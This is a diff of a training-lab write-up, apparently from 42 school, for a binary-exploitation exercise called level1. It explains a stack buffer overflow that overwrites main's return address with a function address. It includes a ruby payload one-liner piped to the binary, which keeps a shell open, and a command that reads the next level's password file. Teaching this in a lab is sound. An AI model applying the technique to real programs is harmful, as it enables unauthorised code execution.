@@ -6,22 +6,24 @@
 #    By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2021/04/23 19:15:34 by fcadet            #+#    #+#              #
-#    Updated: 2021/04/23 22:46:23 by fcadet           ###   ########.fr        #
+#    Updated: 2021/04/24 14:12:04 by fcadet           ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
 - we need to execute run function
 - we can override main return address with run address
-- using gdb we find run address (info function)
-- run @ 0x08048444
+- using gdb we find run address @ 0x08048444
+
 - size of str is 64 bytes
-- next we can have 8 bytes of stack alignment or not
+- next we can have between 0 and 15 bytes of stack alignment
 - then 4 bytes for saved ebp
 - finaly we found the main return address
-- so there is two possible commands : (really ? no)
-	- ruby -e 'print "x" * (64 + 4) + "\x44\x84\x04\x08"' > /tmp/exploit
-	- ruby -e 'print "x" * (64 + 8 + 4) + "\x44\x84\x04\x08"' > /tmp/exploit
-- we can now feed our program stdin with /tmp/exploit and keep sh open with cat
-	- (cat /tmp/exploit; cat) | ./level1
+
+- so we must fill str with a number of random bytes between 68 and 68 + 15
+and add run address to it
+- gdb can give us a clue and shows a difference of 8 bytes between ebp and esp
+	- (ruby -e 'print "x" * (68 + 8) + "\x44\x84\x04\x08"'; cat) | ./level1
+- if we don't see "Good... Wait what" after pressing a key we have to try another
+offset between 0 and 15
 - finally
 	- cat /home/user/level2/.pass
